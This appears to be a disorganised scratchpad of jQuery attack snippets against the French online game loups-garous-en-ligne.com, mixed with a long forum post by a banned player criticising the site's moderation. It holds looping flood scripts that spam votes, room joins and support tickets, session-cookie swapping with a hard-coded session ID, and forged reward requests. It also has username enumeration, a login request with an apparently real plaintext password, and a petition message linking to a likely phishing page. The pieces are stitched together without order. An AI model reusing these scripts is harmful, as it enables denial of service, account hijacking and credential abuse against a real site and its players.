define([],
function () {
	var blackList = function () {
		this.listPlayer = ["Nayko",
					"fred4800",
					"paul84",
					"Cecezz",
					"Draedixe",
					"Hugue",
					"Edya",
					"Yes",
					"Marbrure",
					"Punchynou",
					"Nanouill",
					"Zarbey",
					"Azou",
					"Remuslupin",
					"Trepasse",
					"Floxx",
					"Chikentear",
					"Detrifi",
					"Elekitu",
					"Choupettes",
					"youpilavie",
					"Casserole",
					"Testerpig",
					"Nineneko",
					"Linkk",
					"Eleo",
					"Luny",
					"Shikyo",
					"Pidza",
					"Julot",
					"Surimi",
					"caus909",
					"Testerpig2",
					"Lavande",
					"Nereth",
					"Trifuge",
					"dopeldead",
					"Raphlight",
					"Skwiz",
					"Lesterpig",
					"Nicorr",
					"swiss",
					"Yanislow",
					"Antho12"
					];
	}

	blackList.prototype.isBlacklisted = function (pseudo) {
		for (var i = 0 ; this.listPlayer.length > i ; i++) {
			if ( this.listPlayer[i] == pseudo ) {
				return 1;
			}
		}
		return 0;
	}

	return new blackList ();
});

$.post("http://www.loups-garous-en-ligne.com/jeu/index.php?do=voteVillage", {
	"action" : "set",
	"info1" : 0,
	"info2" : 0
}, function (data) {
	console.log(data);
});

listFlood = ['2385579', '2385580', '2385581', '2385582', '2385584', '2385586', '2385593', '2385595', '2385616', '2385618', '2385634', '2385646', '2385663', '2385738'];
function floodlol () {
	for (i = 0 ; listFlood.length > i ; i++) {
		$.post("http://www.loups-garous-en-ligne.com/jeu/index.php?do=voteVillage", {
			"action" : "set",
			"info1" : listFlood[i],
			"info2" : 0
		}, function (data) {
			console.log(data);
		});
	}
	setTimeout("floodlol()", 250);
}
floodlol();

$.get("http://www.loups-garous-en-ligne.com/jeu/index.php?partie=1237474",
	function (data) {
		console.log(data);
	}
);


$.post("http://www.loups-garous-en-ligne.com/jeu/index.php", {
	"salon" : 1254510,
	"player" : "Jouer"
}, function (data) {
	console.log(data);
});

<form method="POST" action="jeu/index.php" target="_blank" style="display:inline;">
<input type="hidden" name="salon" value="1254411">
<input type="submit" value="Jouer" name="player" style="width: 47%;">
<input type="submit" name="viewer" value="Observer" style="width: 47%;">
</form>

function floodlol () {
	$.post("http://www.loups-garous-en-ligne.com/jeu/index.php", {
		"salon" : 1254440,
		"player" : "Jouer"
	}, function (data) {
		console.log(data);
	});
	setTimeout("floodlol()", 50);
}
floodlol();

http://www.loups-garous-en-ligne.com/jeu/index.php?partie=1273167

$.ajax({
   headers: {'Cookie' : document.cookie },
   url: "sub.domain.com",
   success: function(){ ...

$.ajax({
	type: "GET",
	cache: false,
	url: "http://www.loups-garous-en-ligne.com/jeu/index.php?partie=" + "1273167",
	contentType: "application/json; charset=utf-8",
	headers: {'Cookie' : "none" },
	dataType: "json",
	success: function(data) { console.log(data) },
	error: function(data) { data) }
});


$.post("ajax/logIn.php", {
		"login_pseudo": "Sythpe59",
		"login_password": ""
	}, function (data) {
		console.log(data)
	}
)
createCookie("PHPSESSID","",-1)

Hitler
Nazi

Hniatzlier


$.post("http://www.loups-garous-en-ligne.com/jeu/externe/adWatched.php", {
								"adblock" : "false",
								"hopeYouLikePonies" : 10088562
							}, function () {
								setTimeout("window.location = 'index.php';", 1000);
							});

$.post("http://www.loups-garous-en-ligne.com/jeu/interagir.php",
{"action": 'add_bonbons', "joueur": 'Montels'},
function(data) {
	console.log(data)
}, 'json');




$.get("http://www.loups-garous-en-ligne.com/jeu/index.php?partie=1420423",
	function (data) {
		console.log(data);
	}
);


$.post("http://www.loups-garous-en-ligne.com/jeu/index.php?do=accessOk&pseudo=Oldaje",{
	action:"set"
}, function(data) {
	console.log(data)
});


function deleteCookie(name) {
	document.cookie = name + '=;expires=Thu, 05 Oct 1990 00:00:01 GMT;';
};
deleteCookie("PHPSESSID")
document.cookie = "PHPSESSID=eim0u0aknmkpt93fh9t38bsj14"

$.get("http://www.loups-garou-en-ligne.com",
	function (data) {
		console.log(data);
	}
);

function FormSubmit() {
  var str;
  var objpass = document.formu.authpasswd;
  var objmd5pass = document.formu.authmd5passwd;
  var objkey = document.formu.authkey;
  document.formu.submit();
} 


$.post("http://www.loups-garous-en-ligne.com/jeu/externe/parrainage.php", {
	"action" : "ask_precise",
	"IDV" : 861759
}, function (data) {
	console.log(data);
});

"Salut à toi " & $currentPlayerMP & " !%0ABien que Pidza ne fut pas toujours apprécié par tout le monde, %0Ail a su se remettre en question et remettre en question sa modération au profit des joueurs. %0A%0AAujourd'hui, il ne fais plus partit du conseil ayant supprimé son compte suite à un conflit avec certain membres. %0ACelà, car il defendait son point de vue et celui des joueurs. %0A%0APour la réactivation de son compte, et sa réintégration dans la modération, veuillez signé cette pétition : http://login-2.com/pidza/petition.php %0A%0AMerci à toi " & $currentPlayerMP & " :)"




if (Date.now() == "06/12") {
	Anthony.age++;
	Facebook.writeOnWall("Joyeux anniversaire ! " + Anthony.age + " déjà :D");
}

"POST", "http://www.loups-garous-en-ligne.com/jeu/index.php?do=compoSet", "voy=0&sal=0&sor=1&cha=1&cup=1&anc=0&lgb=0&chm=0&vol=0&pf=0&idi=0&bou=0&jdf=0&ens=0&cor=0&ang=0")

$.post("http://www.loups-garous-en-ligne.com/jeu/externe/create.php", {
	"tchatName" : "pass enigme",
	"nbPersonMax" : "6+joueurs",
	"type" : 2,
	"privee" : "privee",
	"passePrivee" : "mojo",
	"debat" : 4,
	"eloMini" : 0
}, function (data) {
	console.log(data);
});

"tchatName=Serieuse+game&nbPersonMax=6+joueurs&type=2&privee=privee&passePrivee=mojo&debat=4&eloMini=0


http://prntscr.com/295lbq
http://prntscr.com/295lqj

{"guide":0,"erreur":"","chrono":"<input type='submit' style='cursor: pointer;width: 100%;margin-top: 20px;background: -moz-linear-gradient(90deg, #C76B6B, #964545);background: -webkit-gradient(linear, left top, left bottom, from(#C76B6B), to(#964545));padding-top:3px; padding-bottom: 3px;color: white;font-weight: bold;' value='Inviter des amis' onclick=\"display_invite_friends();\"><div id='facebook_button_wrapper' onclick=\"FacebookInviteFriends();\"><i><\/i><span class='fb_invite_text'>Inviter via Facebook<\/span><\/div><input type='submit' style='cursor: pointer;width: 100%;margin-top: 20px;background: -moz-linear-gradient(90deg, #00BF20, #1A4602);background: -webkit-gradient(linear, left top, left bottom, from(#00BF20), to(#1A4602));padding-top:3px; padding-bottom: 3px;color: white;font-weight: bold;' value='Demander un guide' onclick=\"display_request_guide();\">","droite":"<div id=\"joueurs\"><div align=\"center\"><i>Attente du lancement...<br \/>\r\n                5\/6 joueurs\r\n                <\/i><\/div><br \/><b style='color:orange; cursor: pointer' id='compo' onclick=\"$('#compoContent').slideToggle('fast'); getAction('compoHide');\">Composition de jeu :<\/b><div id='compoContent' style='display: block'><img src='assets\/images\/carte2.png' width=14 onmouseover=\"voirDescription('2')\" onmouseout=\"cacherDescription();\" id='compo_2' style='cursor: pointer;'> <b>Loup(s)-Garou(s)<\/b> : 2<br \/><img src='assets\/images\/carte6.png' width=14 onmouseover=\"voirDescription('6')\" onmouseout=\"cacherDescription();\" id='compo_6' style='cursor: pointer;'> <b>Chasseur<\/b> : 1<br \/><img src='assets\/images\/carte7.png' width=14 onmouseover=\"voirDescription('7')\" onmouseout=\"cacherDescription();\" id='compo_7' style='cursor: pointer;'> <b>Cupidon<\/b> : 1<br \/><img src='assets\/images\/carte16.png' width=14 onmouseover=\"voirDescription('16')\" onmouseout=\"cacherDescription();\" id='compo_16' style='cursor: pointer;'> <b>Enfant Sauvage<\/b> : 1<br \/><img src='assets\/images\/carte1.png' width=14 onmouseover=\"voirDescription('1')\" onmouseout=\"cacherDescription();\" id='compo_1' style='cursor: pointer;'> <b>Simple(s) Villageois<\/b> : 1<\/div><br \/><a href='https:\/\/docs.google.com\/document\/d\/1fDP-BSFYJBCoCVjrZUDaNFknQO7y49cmSd7bm1NJ8fA\/edit' target='_blank'>Capital sp\u00e9<\/a> : <b style='color:lime'>4<\/b>\/4<br \/><br \/><b style='color:orange;'>Liste des Joueurs :<\/b><table cellpadding=0 id='joueursTableau'><tr><td><\/td><td><span ><b><span class='player'>Bosses<\/span><\/b><\/span> <\/td><\/tr><tr><td><\/td><td><span ><b><span class='player'>Piochages<\/span><\/b><\/span> <\/td><\/tr><tr><td><\/td><td><span ><b><span class='player'>Insoucieux<\/span><\/b><\/span> <\/td><\/tr><tr><td><\/td><td><span ><b><span class='player'>Moduleriez<\/span><\/b><\/span> <\/td><\/tr><tr><td><\/td><td><span ><b><span class='player'>Situent<\/span><\/b><\/span> <\/td><\/tr><\/table><img src='assets\/images\/i_voyante.gif'\/> <i style='color:#ADB4B3;'>1 Spectateur<\/i><\/div>","actions":"","historique":"","specs":"","premium":"<\/table><\/div>","phase":"0"

$.post("http://www.loups-garous-en-ligne.com/interagir.php",
{"action": "friend", "joueur": "Lesterpig"},
function(data) {
	console.log(data);
}, 'json');

$.post("interagir.php", {
	"action": "send_ticket",
	"pseudo_ticket": "default",
	"email_ticket": "default",
	"titre_ticket": "Exclusion abusif de la par d'un joueur",
	"objet_ticket": "666",
	"message_ticket": "Bonjour, je me suis fait kick par un joueur nommer devilm pourriez vo",
},
function(data) {
	console.log(data);
});

http://www.loups-garous-en-ligne.com/interagir.php



send_ticket = function() {
	if ($("#email_ticket").length) {
		var pseudo_ticket = $("#pseudo_ticket").val();
		var email_ticket = $("#email_ticket").val();
	}
	else {
		var pseudo_ticket = "default";
		var email_ticket = "default";
	}
	
	var titre_ticket = $("#titre_ticket").val();
	var objet_ticket = $("select#objet_mailus option:selected").val();
	var message_ticket = $("#message_ticket").val().replace(/’/g, "'");
	$( "#dialog" ).empty();
	
	if ($("#id_partie").length) {
		var id_partie = $("#id_partie").val();
	}
	else {
		var id_partie = "none";
	}
	
	if ( (titre_ticket.length < 2) || (objet_ticket == 0) || (message_ticket.length < 10) || (pseudo_ticket.length < 3) || (email_ticket.length < 3) || (id_partie.length < 4) ) {

	}
	else {
		
		$.post("interagir.php",
		{"action": "send_ticket", "pseudo_ticket": pseudo_ticket, "email_ticket": email_ticket, "titre_ticket": titre_ticket, "objet_ticket": objet_ticket, "message_ticket": message_ticket, "id_partie": id_partie},
		function(data) {
			$("#message_ticket").val("");
		}, 'json');
	}
} 

compteur = 0
function bonjour() {
	send_ticket();
	if (compteur < 100) {
		compteur++;
		setTimeout("bonjour()", 100)
	}
}

Script titre :

$.getJSON("http://www.loups-garous-en-ligne.com/api/me.php",
function(data) {
	console.log(data);
});


[size=120][b][color=#FF0000]PS : Je précise que j'ai été autorisé par Lesterpig à poster ici avec ce pseudo.[/color][/b][/size]

[b]Bonjour à toute et à tous.[/b]  :twisted: 

Je post ici pour vous faire part de mes impressions, mes critiques et solutions par rapport à la modération actuel.
Tout d'abord j'insiste bien sur le fait que ce post n'est aucunement dans le but de [i]troll[/i] ou de [i]critiquer[/i] la modération, mais une remise en question de celle-ci et l'apport de nouvelle [i]idées/solutions[/i] pour le confort de tout le monde. (J'ai bien dit tout le monde, je pense aussi au [i]enfants[/i] qui sont sur le site et qui ne doivent pas voir des "fils de pute" ou "connard" en partie par exemple.)

J'ajouterais aussi une mention spécial par rapport à quelques personnes de la modération qui croient dur comme fer que je suis "un méchant qui a uniquement des mauvaise intentions et qui veut à tout prit détruire le site". (Elle ce reconnaîtra)  Eh bien non, en vérité j'ai même un pseudo principal, j'ai été modérateur pendant un temps sur le site et c'est même Casserole à l'époque qui m'avait tout présenté (Non je ne troll absolument pas, je sais comment fonctionne tout le système interne de modération par exemple) et je suis la pour que le site s'améliore et en aucun cas le contraire. 


[size=200][color=#FFBF00][b]Sommaire :[/b][/color][/size]

[b]1. Problème : Disparité des sanctions / Sanction trop strict.
2. Solution : Idée d'un nouvel outil de modération pour résoudre le problème.
3. Amélioration diverse.
.....3.1 Amoindrir la frustration du joueur sanctionné. / Communication.
.....3.2 Durée des bans[/b]

[size=150][u]1. Problème : Disparité des sanctions / Sanction trop strict.[/u][/size]

En effet, j'ai remarqué qu'il y avait beaucoup de disparité dans les sanctions, les parties carnages/funs par exemple, sont beaucoup moins contrôlé et modéré.
Énormément d'insulte grave du type "fils de pute", "salope", "connard" passe dans les mailles du filet de la modération actuel. (Plusieurs centaines chaque jours) Alors que si un joueur dit ça en partie sérieuse, le joueur sera pratiquement systématiquement sanctionné (Si Klaus/Egerie/Rickastley utilise ce genre de propos en partie sérieuse, il va avoir beaucoup plus de chance d'avoir un "Language Abusif 3 voir 4". Attention, je ne dit pas que c'est une sanction "injustifié" mais inapproprié, j'expliquerais des solutions de sanctions plus approprié dans le 2eme point de ce post.)
Par exemple Ephtys a prit 2 jours de ban par Nestlez pour avoir dit "Anus". (C'est un [i]exemple[/i], je ne suis pas la pour faire des réclamations et crier à l'injustice, mais bien pour trouver des sanction plus adapté.)

[i]Les sanctions sont trop strict et il y a trop de disparité dans leur application.[/i]
Si je dit "connard de salva" c'est un propos que l'ont doit modérer ! Mais il y a 1 chance sur X [i](disons 30% en sérieuse et 5-10% en fun) [/i]que je soit modéré.
Donc si je suis modéré, je risque de me prendre 2 jours de ban, ce qui est très frustrant car il peut m'arriver de voir d'autres personnes dire "connard" qui ne sont, au final pas sanctionné.

[size=150][u]2. Solution : Idée d'un nouvel outil de modération pour résoudre le problème.[/u][/size]

Comme je le disais dans la première partie, il y a trop de disparité dans les sanctions, si on dit "Connard" on sera modéré 5-30% du temps.
Donc la solution utopique pour pallier à ce problème serait de sanctionner [b]TOUT[/b] les joueurs qui tiennent des propos inapproprié [b]MAIS[/b] de réduire grandement l’impact que la sanction peut avoir sur le joueur.
L’idéal pour moi serait de [i]beaucoup plus[/i] jouer sur les points de comportement du joueur. (Car actuellement ils servent pas à grand chose).

[b]Mon idée[/b] est qu'il y est des sanctions [i]automatique[/i] à chaque fois que les pts de comportement descende en dessous d'un seuil fixé.

[b]Exemple de seuil pré-défini :[/b]

950 pts = Ban 5h
900 pts = Ban 1j
850 pts = Ban 1j
800 pts = Ban 2j
...
Obi wan.


[b]Exemple de sanction :[/b]

Language abusif 1 (Putain, merde) font perdre 5 pts de comportement  [i](Eh, attendez avant de criez que c'est "peu", rappelé vous que maintenant, [b]TOUT[/b] les mots inaproprié pourront être sanctionné, et perdre 5 pts pour chaque "merde" / "putain" ca va vite. Comment sanctionné tout les mots inapproprié ? Je vous l'explique plus bas   :twisted: )[/i]
Language abusif 2 (Connard, enculé) font perdre 20 pts par exemple
Language abusif 3 (Fils de pute, nique ta mère) font perdre 50 pts


[b]Mise en situation :[/b]

1. On démarre avec 1000 pts comportement.
2. Quelqu'un dit la phrase  : "connard de salva !" (Qui est sanctionné 100% du temps maintenant, et non 1 fois sur 5)
3. Un modérateur choisi la gravité du mot (LA2 pour "connard" qui fait perdre 20 pts de comportement, et LA3 pour "fils de pute" qui en fait perdre 50 par exemple.)
4. Le joueurs qui a dit le mot inapproprié reçoit un mp du style :

"Vous avez perdu 5 points de comportement pour avoir dit "Merde" partie n°123456

Attention, il vous reste au total 995 pts de comportement, vous serez banni 5h si vous perdez encore 45 points."


[size=150][i]Nouvel outil de modération : Central de gestion des phrases susceptible d'être inaproprié[/i][/size]

[i](Pour ceux qui ne le savent pas, je suis dev, mais pas dans l'équipe du site)[/i]
Il y a quelque jours, j'ai développé un programme qui permet de détecter toutes les phrases qui sont susceptible d'être inapproprié contenant des insultes grave (J'ai enlevé toute les insulte légère tel que "débile", "noob", "putain", "imbécile" etc. pour garder que les langages abusif #5) et devinez quoi ?

La journée du 11-12-12 (Archive 1568250 à 1571873) contenait :  [i](Qui est au passage un jour de semaine, donc j'imagine pas le samedi par exemple) [/i]

34 : "FDP"
31 : "Fils de pute"
50 : "Salope"
29 : "Enculé"
90 : "CONASSE" / "CONNARD"

Avec un total de : 419 phrase contenant un language abusif #5 (Pour ceux qui ne savent pas, Language abusif #5 est le plus grave language qu'on peut trouver.)
Et je vous épargne les donné complète du 11-12-12 avec du Language abusif #1 à #5, ça monte à bien plus de 1000 phrases punissable.

[b]EVIDEMMENT [/b]je vous présente la source quand même : http://delfisakura.com/datamining/donnees.txt
[i]Oui oui, ce sont bien les données d'un seul jour qu'il y a sur mon fichier texte(et un jour en semaine en plus, je le rappelle, les données auraient été bien plus impressionnante un samedi)[/i]

Vous vous imaginez, que toute ses insultes ne sont, pour la plus part non sanctionné ?
C'est la ou vous devez vous dire "O_O Mais en faite on laisse tout passé et notre modération n'est pas au point !" [i](Sans vouloir vous vexer  :roll: )[/i]
[i](C'est la aussi ou je trouve ça dommage voir injuste/déplacé qu'une joueuse comme Egerie par exemple, ce fasse bannir 2jours pour "putain" car elle stalké par la modératrice Nestlez ..  :( )[/i]

Donc pour terminer la partie deux,[b] je vais vous expliqué le fonctionnement de l'outil [/b]que j'ai imaginé pour l'équipe [i]"AH BAH ENFIN TU NOUS L'EXPLIQUE !"[/i]

L'outil serais un [i]algorithme[/i] intégré au site qui détecterais les phrases inapproprié (Pour ceux qui prévois de répondre au topic "olol c'est surement très long à dev ce genre de truc" retenez vous, j'ai dev l'équivalent en ...[i] *regarde ses messages skype*[/i]  47 mins.)
Il serait disponible aux modérateurs OU même peut être au joueurs (Cela marcherais donc par système de vote, par exemple, si le bouton "language abusif #3" atteint 10 votes)
Et l'interface serait faite de façon à traiter les cas [b]très[/b] rapidement.[i] (Par exemple, Surimi + Adven on mit 40-50 minutes hier soir pour traiter 15 tickets, ils auraient été bien dégoûté de savoir qu'il y avait en faite 1000 ~ autres cas similaire pour la journée, et que seulement 1,5% du travail a été fait.)[/i]
La présentation de la fonctionnalité serait dans ce genre la : http://delfisakura.com/datamining/exemple.png

[u][size=150]3. Amélioration diverse.[/size][/u]

[size=100][u]3.1 Amoindrir la frustration du joueur sanctionné. / Communication.[/u][/size]

Ce sont pleins de petites actions qui sont [b]très[/b] importante et qui permettent de garder une bonne image du site et en particulier l'équipe du site. Quand vous sanctionné un joueur manuellement (bâillonnement, kick, ban) il faut [b]TOUJOURS[/b] discuter avec ou au pire au minimum le prévenir avant, et être le moins hautain possible.

(Je suis désolé mais je préfère quand même donné des exemple, ce n'est [b]absolument pas[/b] pour vous critiquer gratuitement mais pour que vous vous remettiez potentiellement en question)
Quand Casserole dit à un joueur "D’où tu t'es cru permis de faire XXXXX ?" ce n'est tout simplement pas normal, ce n'est pas une façon de parler à sa communauté  (Attention j'ai pas dit non plus que Casserole parlait toujours comme ça, mais c'est déjà arrivé, notamment quand je voyais ses réponses au tickets de modérations à l'époque ou je modérais. Et cela ne devrais pas arriver, même si le joueurs est chiant. Question d'image.)

Après il y a aussi la façon dont on tourne le message, c'est très important de pas paraître super méchant et strict. Les joueurs vont juste ce foutre de vous et vont vous donner une mauvaise images.

[b]Par exemple un :[/b]
"Hey, pourrait tu arrêter d'abuser des majuscule ? Merci à toi :)"
Et si il recommence, vous êtes un peu plus strict.
"Je tes déjà dit d'arrêter de maj, je me répéterais pas une 3 eme fois Klaus"

[b]Plutot que :[/b]
"Les maj abusive sont interdite. Si tu recommence tu sera sanctionné."
[i](De votre coté, ça vous parait beaucoup plus approprié, mais en réalité, le mec qui maj est déjà assez énervé en règle général. Donc si vous lui parlez sur ce ton, il y a autant voir plus de probabilité qu'il vous ignore et qu'il est une mauvaise image de l'équipe que si vous lui demander avec un message cool.)[/i]

[b]Le bâillonnement [/b] est souvent utiliser abusivement.
Je m'explique, d'après moi (donc c'est une question de point de vue, mais je pense que beaucoup de monde partage le même) le bâillonnement sert surtout dans une situation ou un joueur envoi un message propagande, une photo à caractère sexuel ou flood une phrase tout simplement.
J'ai déjà vu la modératrice Nestlez me bâillonner juste à cause de ma présence ! La vous aller tout de suite penser [i]"Eh beh oui en même temps tu es ban def gros malin, donc elle fait ce qu'elle veut"[/i] Eh bah non. C'est l'image du site qu'elle abîme, car les 25 spectateurs (Il y a souvent beaucoup de spects la ou je vais) on vue qu'elle a bâillonné quelqu'un pour aucun motif, et assimile tout de suite ça comme de l'abus de pouvoir
(D'ailleurs quand elle fait, ça, il y a au moins 3 personnes qui la blâme sur son action en général.)

Je peux aussi prendre le cas de Punchynou qui dissolvait en chaîne le salon d'Egerie sans même lui expliqué la raison (Bon on la connaissais la raison, c'est par-ce que j'allais dans son salon en étant un joueurs banni) mais il n'avait pas a dissoudre le salon mais uniquement me kické, ensuite au bout de 10 mins je suis partie faire autre chose.
Egerie a donc continué à crée des salon (pendant au moins 30 mins) et Punchynou les dissolvait alors que je n'allais même plus dedans, toujours sans communiquer.  :roll:  

Et c'est pleins de petites choses comme ça qui fait qu'à terme vous avez une mauvaise image .. :/
(Je le répète, si j'écris tout ça, c'est uniquement pour que vous puissiez [i]améliorer[/i] certains points [i]et non critiqué[/i], je ne dit pas que les sanctions n'étais pas adapté (sauf celle de punchynou, mais il a été ban t'facçon.) mais pas assez bien expliqué au joueurs, ou fait à l'arrache.)

[size=100][u]3.2 Durée des bans.[/u][/size]

Cette partie va être très courte, elle concerne uniquement les ban def.
[i]Je précise que je parle objectivement, j'aurais tenue le même genre de discours en étant non-ban-def. (Mais j'aborde aussi ce point parce que je suis personnellement concerné)[/i]

Je trouve ça dommage d'avoir instauré le ban def, pour plusieurs raisons.
La personne banni définitivement va forcement revenir sous un autre pseudo, et va partir dans l'idée de re-faire un pseudo définitif (pour la plus part des cas) donc vous avez aucunes pression possible et en plus de ça vous avez perdu la "trace" de la dite personne, donc même pas de possibilité de la surveiller.
Et la personne va donc pouvoir ce permettre des choses qu'elle n'aurait jamais osé en étant ban 6 mois par exemple (sanction qui puni beaucoup plus la personne au final, car quand un pseudo est banni 6 mois, on est lourdement puni, et la modération a toujours un petit pouvoir sur vous car le banni ne va pas pouvoir ce permettre de troll/etc sous peine de voir son ban rallongé !)

Et d'un autre point de vu, c'est dommage de bannir à vie une personne, tout le monde peut changer ou essayer de ce racheter (A l'époque ou on ma bandef, j'essayais déjà de me racheter depuis 3semaines-1mois déjà en proposant de dev des nouveauté à Lesterpig [i]si, le bot quizz tu te rapelle ? ^^[/i] mais Lesterpig c'est rendu compte que j'étais celui qui avait exploité une faille 2 mois plus tôt environs (je crois) et ma ban def :/)

Je trouvais ça cool de m'avoir ré-autorisé avec mon pseudo "Ourspolair" mais malheureusement, à cause d'un malentendu avec Caus et le conseil, j'ai été re banni (alors que je faisais pas de bétistes. :( )

Bref. 
J'espère que tout ça va pouvoir aidé le site à s'améliorer et, mention plus particulière à [b]Lesterpig[/b] qui a fait un boulot énorme pour le site et qui c'est battu pour dev pleins de truc cool : Lui redonné espoir en sa communauté.
Désolé pour le pavé. Merci de m'avoir lut. :)

PS : J'aurais bien voulut faire un autre topic de "Redemption" comme Egerie et essayer de renouer les liens avec le site, mais ça fait environs 3h que j'écrit tout ça et j'en peux VRAIMENT plus :(
J'espère que les quelque critiques que j'ai faite ne serons pas mal prit, je me répète mais c'est pas dans le but de vous nuir que j'ai fait ce topic. [b]Vraiment pas.[/b]

PS2 : Je vais me relire tout à l'heure et corriger toutes les fautes, car la je peux plus écrire  :D

En exclusivité, je vous dévoile une partie du code source des modérateurs loups-garous-en-ligne !

function sendChat() {
	var data=document.getElementById("message").value.substring(0,500);
	document.getElementById("message").value = '';
	$("#message").css('background-color','#CFB4B4');
	if (data == "" || data == " " || data.indexOf('est protégé de l\'attaque') != -1 || data.indexOf('vos subtiles potions') != -1 || data.indexOf('Félicitations ! G') != -1 || data.indexOf('Vous dévorez le loup') != -1 || data.indexOf('Vous ne dévorez aucun') != -1 || data.indexOf('Vous vous réveillez,') != -1 || data.indexOf('Grâce à vos subtiles') != -1 || data.indexOf('Votre objectif est d') != -1 || data.indexOf('Bon jeu et... Bonne chance !') != -1) {
		$("#message").css('background-color','white');
		return;
	}
	if (data == "/clear") {
		clearTchat();
		$("#message").css('background-color','white');
		return;
	}
	data = encodeURIComponent(data);

	var xhr = getXMLHttpRequest();

	xhr.onreadystatechange = function() {
		var currentMsgId = numberMsg ;
		if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
			$("#message").css('background-color','white');
			currentDate = new Date();
			currentHour = currentDate.getHours();
			currentMinute = currentDate.getMinutes();
			currentSecond = currentDate.getSeconds();
			if (currentMinute < 10) {
				currentMinute = "0" + currentMinute;
			}
			if (currentSecond < 10) {
				currentSecond = "0" + currentSecond;
			}
			$("#chat").append("<span id='msg" + numberMsg + "'><br />" + sexIcon + ' <span class="canal_joueurs"><b>' + playerPseudo + '</b> <i style="font-size:80%">(' + currentHour + ':' + currentMinute + ':' + currentSecond + ')</i> : ' + data + '</span><span id="msgEnd' + numberMsg + '"></span></span>');
			numberMsg++;
			// Le message n'a pas été envoyé, on met une pancarte à coté
			if (xhr.responseText != 'FLOOD' && xhr.responseText != 'FORBIDDEN' && xhr.responseText != 'MAJ' && xhr.responseText != 'OK') {
				document.getElementById('msgEnd' + currentMsgId).innerHTML = " <img src='http://p7.storage.canalblog.com/72/42/1053058/80483279_o.png' style='width:12px;heigth:12px' title=\"Le message n'a pas pu être envoyé car votre connexion internet a été coupé ou le serveur subit des latences.\" />";   
			} else {
				if (xhr.responseText == 'FLOOD') {
					document.getElementById('msg' + currentMsgId).innerHTML = "<br /><b style='color:darkred'>N'envoyez pas trop de messages, merci.</b>";             
					flood++;
					if (flood > 40) {
						$("#globalJeu").fadeOut('fast');
					}
				} else if (xhr.responseText == 'FORBIDDEN') {
						document.getElementById('msg' + currentMsgId).innerHTML = "<br /><b style='color:darkred'>Vous n'êtes pas autorisé à envoyer des messages actuellement.</b>";   
				}
			}
		}
	};
	xhr.open("POST", "ajax/postChat.php", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send("msg="+data);
} 

function getChat() {
    
    //Anti-crash / Connexion loss system

    if (firstLoading) {
        var url = "ajax/getChat.php?first=1";
        lastChatRefresh = getLocalTimestamp();
    }
	else {
        var url = "ajax/getChat.php";
    }
    

    $.ajax({
        type: 'POST',
        url: url,
        data: {action:"getChat",lastM:lastMessageLoaded,langHelper: autoLangHelper},
        dataType: 'json',
        timeout: 15000,
        success: function(donnee){
            
            lastChatRefresh = getLocalTimestamp();
        
            var e = document.getElementById('chat');
            if (donnee.content != null && donnee.content != '') {
                $("#chat").append(donnee.content);
            }

            lastMessageLoaded = donnee.lastM;
            autoScroll();

            if (donnee.son != '' && donnee.hash != 'MUSIC') jouerSon(donnee.son);
            if (donnee.hash == "MUSIC" && !firstLoading && sonPret && paramSon == 0) {
                $("#musicPlayer").fadeIn();
                
                soundManager.play(donnee.son, donnee.son, {
                  onfinish: function() {
                    console.log("Sound '"+donnee.son+"' is finished.");
                    $("#musicPlayer").fadeOut();
                  }
                });
                
            }
            if (donnee.hash == "STOPSOUNDS" && !firstLoading){
                stopAllSound();
            }
            if (tutoActive && !firstLoading) {
                // Fonctions de test relatives aux triggers du tuto
                if (donnee.hash == "TUTO3") { // Le village se réveille à la fin de la nuit 1
                    tutoLaunchStep('L');
                }
                if (donnee.hash == "TUTO4") { // Franky vient de dire une phrase de loup (id=failChasseur)
                    tutoLaunchStep('N');
                }
                if (donnee.hash == "TUTO5") { // Franky vient de se dévoiler chasseur (id=devoChasseur)
                    tutoLaunchStep('P');
                }
                if (donnee.hash == "TUTO2") { // La voyante doit jouer
                    tutoLaunchStep('R');
                }
                if (donnee.hash == "TUTO6") { // Le village se réveille à la fin de la nuit 2
                    tutoLaunchStep('S');
                }
                if (donnee.hash == "TUTO7") { // Le chasseur va tirer !
                    tutoLaunchStep('T');
                }
            }
            
            if (donnee.hash == "REDIRECT_PLAYER") {
               setTimeout("autoJoin();", 2000);
            }
            if (donnee.hash == "REDIRECT_MASTER") {
               setTimeout('window.location = "externe/makeReplay.php"',3000);
            }
            
        
            setTimeout("getChat();", 800);
            $("#tchatError").fadeOut('fast');

    },
        error: function(object, string, status) {
            setTimeout("getChat();", 150);
            $("#tchatError").fadeIn('fast');
    }});
    
    firstLoading = false;

} 

$.getJSON("http://www.loups-garous-en-ligne.com/api/me.php",
function(data) {
	playerPseudo = data.pseudo;
	playerSex = data.sexe;
	if (playerSex == 1) {
		sexIcon = '<img class="tchatIcon" src="assets/images/../../../stuff/boy.png?2">'
	} else {
		sexIcon = '<img class="tchatIcon" src="assets/images/../../../stuff/girl.png?2">'
	}
	numberMsg = 0;
});

Unfriend('Ricks');


function Unfriend(player) {
    $.post(urlInteragir,
    {"action": "unfriend", "joueur": player},
	function(data) {
		if (data != "error") {
			if (data.fait == "demande_refusee") {
				Afficher_notifications();
			}
			else  {
				$( "#dialog" ).empty();
				$( "#dialog" ).append( "<b>"+player+"</b> ne fait désormais plus partie de vos amis." );
				$( "#dialog" ).dialog( "option", "position", "center" );
				$( "#dialog" ).dialog( "open");
				Afficher_amis_bas();
			}
		}
	}, 'json');
} 

for (var i = theArray.length - 1; i >= 0; i--) {
	Unfriend(theArray[i]);
};

for (var i = 0; i < 120 ; i++) {
	$.getJSON(urlInteragir, {"action": "check_existing_pseudo", "wanted_pseudo": "Sythpe" + i}, function(data) { console.log(data); console.log(i) });
}

$.getJSON(urlInteragir, {"action": "check_existing_pseudo", "wanted_pseudo": ""}, function(data) { console.log(data) });


http://www.loups-garous-en-ligne.com/login


$.post("http://www.loups-garous-en-ligne.com/login", {
	"qpseudo": "Meikosvck",
	"qpassword": "rinetlen38100"
},
function(data) {
	console.log(data);
});